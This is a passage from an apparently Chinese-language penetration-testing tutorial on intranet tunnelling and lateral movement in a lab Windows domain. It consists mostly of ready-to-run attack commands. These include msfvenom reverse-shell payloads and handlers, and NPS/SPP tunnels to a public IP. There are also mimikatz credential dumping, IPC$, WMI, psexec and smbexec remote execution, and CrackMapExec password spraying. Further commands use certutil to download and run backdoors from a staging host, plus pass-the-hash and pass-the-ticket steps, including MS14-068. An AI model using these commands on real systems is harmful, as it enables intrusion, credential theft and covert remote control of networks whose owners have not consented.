<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">服务端启动</span></span><br><span class="line">./nps install &amp;&amp; ./nps</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">访问：</span></span><br><span class="line">http://IP:8080/ admin/123</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">创建客户端，生成密匙</span></span><br><span class="line">./npc -server=47.94.236.117:8024 -vkey=uajwhbu9155qh89v</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">msf生成木马，远程绑定5555,指向本地 6666</span></span><br><span class="line">msfvenom -p windows/meterpreter/reverse_tcp lhost=47.94.236.117 lport=5555 - f exe -o nps.exe</span><br><span class="line">use exploit/multi/handler</span><br><span class="line">set payload windows/meterpreter/reverse_tcp</span><br><span class="line">set LHOST 0.0.0.0</span><br><span class="line">set LPORT 6666</span><br><span class="line">run</span><br></pre></td></tr></table></figure>
<h4 id="spp上线内网机器"><a class="markdownIt-Anchor" href="#spp上线内网机器">#</a> Spp 上线内网机器</h4>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">服务端：监听本地的icmp数据</span></span><br><span class="line">./spp -type server -proto ricmp -listen 0.0.0.0</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">客户端：将本地的 8082 给到 117 这 8081 上（TCP封装icmp）</span></span><br><span class="line">spp -name &quot;test&quot; -type proxy_client -server 47.94.236.117 -fromaddr :8082 -toaddr :8081 -proxyproto tcp -proto ricmp</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">CS配置</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">监听器 1 ：http 47.94.236.117 8081</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">监听器 2 ：http 127.0.0.1 8082 - 生成后门</span></span><br></pre></td></tr></table></figure>
<h3 id="横向渗透技术"><a class="markdownIt-Anchor" href="#横向渗透技术">#</a> 横向渗透技术</h3>
<ul>
<li>域信息收集</li>
</ul>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">利用cs脚本收集是否存在域，域内用户，端口开放情况，明文和<span class="built_in">hash</span>值</span></span><br><span class="line">net user /domain （cs使用时需要在命令前加shell）</span><br><span class="line">mimikatz logonpasswords</span><br><span class="line">Ladon Adfinder BloodHound</span><br></pre></td></tr></table></figure>
<h4 id="ipc-横向移动"><a class="markdownIt-Anchor" href="#ipc-横向移动">#</a> IPC 横向移动</h4>
<p>IPC 是专用管道，可以实现对远程计算机的访问，需要使用目标系统用户的账号密码，使用 139 、 445 端口。</p>
<p>（ 1 ）IPC 上线的使用流程</p>
<p>建立 IPC 链接到目标主机、拷贝要执行的命令脚本到目标主机、查看目标时间，创建计划任务（at、schtasks）定时执行拷贝到的脚本、删除 IPC 链接</p>
<p>（ 2 ）IPC 使用时需要的命令</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">工作组</span></span><br><span class="line">net use \\server\ipc$ &quot;password&quot; /user:username </span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">域内</span></span><br><span class="line">net use \\server\ipc$ &quot;password&quot; /user:domain\username </span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">查看文件列表</span></span><br><span class="line">dir \\xx.xx.xx.xx\C$\ </span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">下载文件</span></span><br><span class="line">copy \\xx.xx.xx.xx\C$\1.bat 1.bat </span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">复制文件</span></span><br><span class="line">copy 1.bat \\xx.xx.xx.xx\C$ </span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">删除IPC</span></span><br><span class="line">net use \\xx.xx.xx.xx\C$\1.bat /del </span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">查看对方共享</span></span><br><span class="line">net view xx.xx.xx.xx </span><br></pre></td></tr></table></figure>
<p>（ 3 ）建立 IPC 失败的原因</p>
<p>目标系统不是 NT 或以上的操作系统、对方没有打开 IPC$ 共享、对方未开启 139、445 端口，或者被防火墙屏蔽、输出命令、账号密码有错误</p>
<p><strong>IPC 渗透完整流程</strong></p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">上线配置</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">正向：配置监听器beacon_bind_tcp并生成木马，木马运行连接</span></span><br><span class="line">connect 192.168.3.32 4444</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">反向：选择需要转发的已经控制的肉鸡，代理转发-&gt;转发上线-&gt;beacon.exe</span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Windows2012以下采用at命令</span></span><br><span class="line">net use \\192.168.3.21\ipc$ &quot;Admin12345&quot; /user:god.org\administrator # 建立ipc连接</span><br><span class="line">copy beacon.exe \\192.168.3.21\c$ #拷贝执行文件到目标机器</span><br><span class="line">at \\192.168.3.21 15:47 c:\beacon.exe #添加计划任务</span><br><span class="line">* 计划任务执行后，木马被执行，在cs上会上线</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Windows2012及其以上采用schtasks命令</span></span><br><span class="line">net use \\192.168.3.32\ipc$ &quot;admin!@#45&quot; /user:god.org\administrator # 建立ipc连接</span><br><span class="line">copy beacon.exe \\192.168.3.32\c$ #复制文件到其C盘</span><br><span class="line">schtasks /create /s 192.168.3.32 /ru &quot;SYSTEM&quot; /tn beacon /sc DAILY /tr c:\beacon.exe /F #创beacon任务对应执行文件</span><br><span class="line">schtasks /run /s 192.168.3.32 /tn beacon /i #运行beacon任务</span><br><span class="line">schtasks /delete /s 192.168.3.21 /tn beacon /f#删除beacon任务</span><br></pre></td></tr></table></figure>
<ul>
<li>Impacket-Atexec 套件</li>
</ul>
<p>该工具是一个半交互的工具，适用于 Webshell 下，Socks 代理下；在渗透利 用中可以收集用户名、明文密码、密码 hash、远程主机等做成字典，批量测试。 一般选择 py 程序，比较轻量，体积较小，不易被识别。需要编写脚本进行批量 通过 IPC 通道下载木马，执行木马，针对不同的用户名，密码，hash 尝试。</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">py版：https://github.com/SecureAuthCorp/impacket</span></span><br><span class="line">python atexec.py god/administrator:Admin12345@192.168.3.21 &quot;ver&quot;</span><br><span class="line">python atexec.py -hashes :ccef208c648* ./administrator@192.168.3.21 &quot;v&quot;</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Exe版：https://gitee.com/RichChigga/impacket-examples-windows</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">CS本地用户明文连接</span></span><br><span class="line">shell atexec.exe ./administrator:Admin12345@192.168.3.21 &quot;whoami&quot;</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">CS域内用户明文连接</span></span><br><span class="line">shell atexec.exe god/administrator:Admin12345@192.168.3.21 &quot;ver&quot;</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">CS域内本地用户明文密文连接</span></span><br><span class="line">shell atexec.exe - hashes :ccef208c648526* ./administrator@192.168.3.21 &quot;whoami&quot;</span><br><span class="line">shell atexec.exe - hashes :ccef208c648526* god/administrator@192.168.3.21 &quot;whoami&quot;</span><br></pre></td></tr></table></figure>
<h4 id="wmi-横向渗透"><a class="markdownIt-Anchor" href="#wmi-横向渗透">#</a> WMI 横向渗透</h4>
<p>WMI 是通过 135 端口进行利用，支持用户名明文或者 hash 的方式进行认证，并且该方法不会在目标日志系统留下痕迹。</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">wmic 内部：(单执行，只能用明文密码)</span></span><br><span class="line">wmic /node:192.168.3.32 /user:administrator /password:admin!@#45 process</span><br><span class="line">call create &quot;cmd.exe /c certutil -urlcache -split -f http://192.168.3.31/beacon.exe c:/beacon.exe &amp; c:/beacon.exe&quot;</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">cscript 内置：(生成交互式shell)</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">先上传wmiexec.vbs至肉机</span></span><br><span class="line">cscript //nologo wmiexec.vbs /shell 192.168.3.21 administrator Admin12345</span><br></pre></td></tr></table></figure>
<ul>
<li>Impacket-Wmiexec 套件</li>
</ul>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">通过明文密码或者<span class="built_in">hash</span>执行命令：</span></span><br><span class="line">wmiexec ./administrator:admin!@#45@192.168.3.32 &quot;whoami&quot;</span><br><span class="line">wmiexec -hashes :518b98ad4178a ./administrator@192.168.3.32 &quot;whoami&quot;</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">下载后门并执行：</span></span><br><span class="line">wmiexec ./Administrator:admin!@#45@192.168.3.32 &quot;cmd.exe /c certutil -urlcache -split -f http://192.168.3.31/beacon.exe c:/beacon.exe &amp; c:/beacon.exe &quot;</span><br></pre></td></tr></table></figure>
<h4 id="smb-横向渗透"><a class="markdownIt-Anchor" href="#smb-横向渗透">#</a> SMB 横向渗透</h4>
<p>利用 SMB 服务可以通过明文或 hash 传递来远程执行， 445 服务端口开放。</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">内置命令psexec64 、外部命令psexec</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">内部</span></span><br><span class="line">psexec64 \\192.168.3.32 - u administrator - p admin!@#45 - s cmd</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">外部</span></span><br><span class="line">psexec -hashes :518b98ad4178a53695dc997aa02d455c ./administrator@192.168.3.32</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">插件：cs-psexec</span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">内置命令services</span></span><br><span class="line">services -hashes :518b98ad4178a53695dc997aa02d455c ./administrator:@192.168.3.32 create -name shell -display shellexec -path C:\Windows\System32\shell.exe</span><br><span class="line">services -hashes :518b98ad4178a53695dc997aa02d455c ./administrator:@192.168.3.32 start -name shell</span><br></pre></td></tr></table></figure>
<ul>
<li>Impacket-Smbexec 套件</li>
</ul>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">针对明文密码</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">普通用户</span></span><br><span class="line">smbexec ./administrator:admin!@#45@192.168.3.32</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">域内用户</span></span><br><span class="line">smbexec god/administrator:admin!@#45@192.168.3.32</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">针对<span class="built_in">hash</span>（交互式的shell，可以在cmd上下载木马绕过杀软）</span></span><br><span class="line">smbexec -hashes :518b98ad4178a53695dc997aa02d455c ./administrator@192.168.3.32</span><br><span class="line">smbexec -hashes :518b98ad4178a53695dc997aa02d455c god/administrator@192.168.3.32</span><br></pre></td></tr></table></figure>
<h4 id="crackmapexec"><a class="markdownIt-Anchor" href="#crackmapexec">#</a> CrackMapExec</h4>
<p>（ 1 ）工具批量密码喷射（支持 hash）</p>
<p>Github：<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL1BvcmNoZXR0YS1JbmR1c3RyaWVzL0NyYWNrTWFwRXhlYw==">https://github.com/Porchetta-Industries/CrackMapExec</span><br>
 官方手册：<span class="exturl" data-url="aHR0cHM6Ly9tcGduLmdpdGJvb2suaW8vY3JhY2ttYXBleGVjLw==">https://mpgn.gitbook.io/crackmapexec/</span><br>
 部分案例：<span class="exturl" data-url="aHR0cHM6Ly93d3cuZnJlZWJ1Zi5jb20vc2VjdG9vbC8xODQ1NzMuaHRtbA==">https://www.freebuf.com/sectool/184573.html</span><br>
 下载对应 release，建立 socks 连接，设置 socks 代理，配置规则，调用！</p>
<p>（ 2 ）Linux Proxychains 使用</p>
<p>安装使用：<span class="exturl" data-url="aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMDg2NjkwL2FydGljbGUvZGV0YWlscy8xMjE3Nzk4MzI=">https://blog.csdn.net/qq_53086690/article/details/121779832</span><br>
 代理配置：Proxychains.conf<br>
 代理调用：Proxychains 命令</p>
<p>（ 3 ）CrackMapExec 使用</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">密码喷射域用户登录</span></span><br><span class="line">proxychains python cme smb 192.168.3.21-32 -u administrator -p &#x27;admin!@#45&#x27;</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">密码喷射本地用户登录</span></span><br><span class="line">proxychains python cme smb 192.168.3.21-32 -u administrator -p &#x27;admin!@#45&#x27; --local-auth</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">密码喷射本地登录命令执行</span></span><br><span class="line">proxychains python cme smb 192.168.3.21-32 -u administrator -p &#x27;admin!@#45&#x27; -x &#x27;whoami&#x27; --local-auth</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">密码喷射本地登录命令执行上线</span></span><br><span class="line">proxychains python cme smb 192.168.3.21- 32 - u administrator -p &#x27;admin!@#45&#x27; -x &#x27;cmd.exe /c certutil -urlcache -split -f http://192.168.3.31/4455.exe c:/4455.exe &amp; c:/4455.exe&#x27; --local-auth</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">密码喷射域登录命令执行上线</span></span><br><span class="line">proxychains python cme smb 192.168.3.21- 32 - u administrator -p &#x27;admin!@#45&#x27; -x &#x27;cmd.exe /c certutil -urlcache -split -f [http://192.168.3.31/4455.exe](http://192.168.3.31/4455.exe) c:/4455.exe &amp; c:/4455.exe&#x27;</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">密码喷射本地和域登录命令执行全自动上线</span></span><br><span class="line">proxychains python cme smb 192.168.3.21- 32 - u user.txt -p pass.txt -x &#x27;cmd.exe /c certutil -urlcache -split -f [http://192.168.3.31/4455.exe](http://192.168.3.31/4455.exe) c:/4455.exe &amp; c:/4455.exe&#x27;</span><br><span class="line">proxychains python cme smb 192.168.3.21- 32 - u administrator -p pass.txt -x &#x27;cmd.exe /c certutil -urlcache -split -f [http://192.168.3.31/4455.exe](http://192.168.3.31/4455.exe) c:/4455.exe &amp; c:/4455.exe&#x27; --local-auth</span><br></pre></td></tr></table></figure>
<h4 id="pth-哈希传递攻击"><a class="markdownIt-Anchor" href="#pth-哈希传递攻击">#</a> PTH 哈希传递攻击</h4>
<p>PTH (pass the hash)：哈希传递攻击，利用的 lm 或 ntlm 的值进行的渗透测试（NTLM 认证攻击）</p>
<p>PTH = Pass The Hash，通过密码散列值 (通常是 NTLM Hash) 来进行攻击。 在域环境中，用户登录计算机时使用的域账号，计算机会用相同本地管理员账 号和密码。因此，如果计算机的本地管理员账号和密码也是相同的，攻击者就 可以使用哈希传递的方法登录到内网主机的其他计算机。另外注意在 Window S erver 2012 R2 之前使用到的密码散列值是 LM、NTLM，在 2012 R2 及其版本 之后使用到的密码散列值是 NTLM Hash。</p>
<p>（ 1 ）mimikatz</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">改回连时间-提权至system-继续改回连时间-导出<span class="built_in">hash</span>和明文此方法会在肉鸡上弹出cmd，如果条件不满足，则一般不采用这种方法</span></span><br><span class="line">mimikatz privilege::debug</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">通过pth导入票据攻击此票据对应的机器</span></span><br><span class="line">mimikatz sekurlsa::pth /user:administrator /domain:192.168.3.32 /ntlm:518b98ad4178a5xxx</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">在肉鸡上弹出来的cmd执行以下命令</span></span><br><span class="line">net use \\192.168.3.32\c$</span><br><span class="line">copy beacon.exe \\192.168.3.32\c$</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">通过创建服务绑定exe程序上线exe程序</span></span><br><span class="line">sc \\sqlserver create bshell binpath= &quot;c:\4.exe&quot;</span><br><span class="line">sc \\sqlserver start bshell</span><br></pre></td></tr></table></figure>
<p>（ 2 ）impacket 套件</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">将肉鸡进行socket代理转发，用proxifier建立规则，通过本机的套件进行测试，通过cs的文件浏览功能将木马放在跳板机web上</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">用cmd窗口下载木马运行上线。当<span class="built_in">hash</span>与所要攻击的主机及用户名对应的时候，则会取得权限。但是受限于这三种方法的协议端口是否正常开启。</span></span><br><span class="line">psexec -hashes :NTLM值 域名/域用户@域内ip地址</span><br><span class="line">smbexec -hashes :NTLM值 域名/域用户@域内ip地址</span><br><span class="line">wmiexec -hashes :NTLM值 域名/域用户@域内ip地址</span><br><span class="line">python psexec.py -hashes :518b98ad48a* ./administrator@192.168.3.32</span><br><span class="line">python smbexec.py -hashes :518b98ad78a* ./administrator@192.168.3.32</span><br><span class="line">python wmiexec.py -hashes :518b98ad41a* ./administrator@192.168.3.32</span><br></pre></td></tr></table></figure>
<p>（ 3 ）CrackMapExec 密码喷射<br>
项目地址：<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL1BvcmNoZXR0YS1JbmR1c3RyaWVzL0NyYWNrTWFwRXhlYw==">https://github.com/Porchetta-Industries/CrackMapExec</span><br>
 官方手册：<span class="exturl" data-url="aHR0cHM6Ly9tcGduLmdpdGJvb2suaW8vY3JhY2ttYXBleGVjLw==">https://mpgn.gitbook.io/crackmapexec/</span><br>
 部分案例：<span class="exturl" data-url="aHR0cHM6Ly93d3cuZnJlZWJ1Zi5jb20vc2VjdG9vbC8xODQ1NzMuaHRtbA==">https://www.freebuf.com/sectool/184573.html</span></p>
<p>下载对应 release，建立 socks 连接，设置 socks 代理，配置规则，修改 Proxychains.conf 进行代理配置，而后通过 Proxychains 调用命令。依次对所有扫描到的用户进行 pth 攻击。</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">a. 域用户HASH登录</span></span><br><span class="line">proxychains python cme smb 192.168.3.21- 32 - u user.txt -H 518b98adxxx</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">b. 本地用户HASH登录</span></span><br><span class="line">proxychains python cme smb 192.168.3.21- 32 - u administrator -H 518b98xxx --local-auth</span><br></pre></td></tr></table></figure>
<h4 id="ptt-票据传递攻击"><a class="markdownIt-Anchor" href="#ptt-票据传递攻击">#</a> PTT 票据传递攻击</h4>
<p>PTT (pass the ticket) ：票据传递攻击，利用的票据凭证 TGT 进行渗透测试（Kerberos 认证攻击）</p>
<p>Kerberos 相当于 web 中的 cookie 和 session，需要进行身份认证。票据自生成之后，存活时间较短，一般设置为 7 天，票据存活失效之后，此票据便无用。</p>
<p>链接：<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2dlbnRpbGtpd2kva2VrZW8vcmVsZWFzZXM=">https://github.com/gentilkiwi/kekeo/releases</span></p>
<p>（ 1 ）MS14068 (webadmin 权限)<br>
 项目地址：<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2FiYXRjaHkxNy9XaW5kb3dzRXhwbG9pdHMvdHJlZS9tYXN0ZXIvTVMxNC0wNjg=">https://github.com/abatchy17/WindowsExploits/tree/master/MS14-068</span></p>
<p>MS14-068 是密钥分发中心 (KDC) 服务中的 Windows 漏洞。它允许经过 身份验证的用户在其 Kerberos 票证 (TGT) 中插入任意 PAC。该漏洞位于 kdcs vc.dll 域控制器的密钥分发中心 (KDC) 中。用户可以通过呈现具有改变的 PAC 的 Kerberos TGT 来获得票证。利用漏洞生成的用户的新身份票据尝试认证</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">获取SID值</span></span><br><span class="line">shell whoami/user</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">生成票据文件</span></span><br><span class="line">shell ms14-068.exe -u webadmin@god.org -s S-1-5-21-121 8902331-2157346161-1782232778-1132 -d 192.168.3.21 -p admin!@#45</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">清除票据连接</span></span><br><span class="line">shell klist purge</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">内存导入票据</span></span><br><span class="line">mimikatz kerberos::ptc TGT_webadmin@god.org.ccache</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">查看当前票据</span></span><br><span class="line">shell klist</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">连接目标上线</span></span><br><span class="line">shell dir \\OWA2010CN-GOD\c$</span><br><span class="line">shell net use \\OWA2010CN-GOD\C$</span><br><span class="line">copy beacon.exe \\OWA2010CN-GOD\C$</span><br><span class="line">sc \\OWA2010CN-GOD create bindshell binpath= &quot;c:\beacon.exe&quot;</span><br><span class="line">sc \\OWA2010CN-GOD start bindshell</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">注意：成功不成功看DC域控漏洞补丁打没打</span></span><br></pre></td></tr></table></figure>
<p>（ 2 ）kekeo (高权限，需 NTLM)<br>
 当前主机肯定之前与其他主机连接过，所以本地会生成了一些票据，可以<br>
导出这些票据，然后再导入票据进行利用。该方法类似于 cookie 欺骗。但是票 据是有有效期的，当前主机在连接过域控的话，有效期内可利用。即利用获取 的 NTLM 生成新的票据尝试认证。工具比较小的话可以上传到肉鸡，如果比较 大，还是需要通过 socket 代理。</p>
<p>通过横向到其他主机尽可能获得到比较多的 hash 值进行测试：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">生成票据</span></span><br><span class="line">shell kekeo &quot;tgt::ask /user:Administrator /domain:god.org /ntlm:ccef208c6485269c20db2cad21734fe7&quot; &quot;exit&quot;</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">导入票据</span></span><br><span class="line">shell kekeo &quot;kerberos::ptt TGT_Administrator@GOD.ORG_krbtgt~god.org@GOD.ORG.kirbi&quot; &quot;exit&quot;</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">查看票据</span></span><br><span class="line">shell klist</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">利用票据连接</span></span><br><span class="line">shell dir \\owa2010cn-god\c$</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">注意：成功不成功看ntlm哈希值的正确性</span></span><br></pre></td></tr></table></figure>
<p>（ 3 ）mimikatz (高权限，需 Ticket)</p>
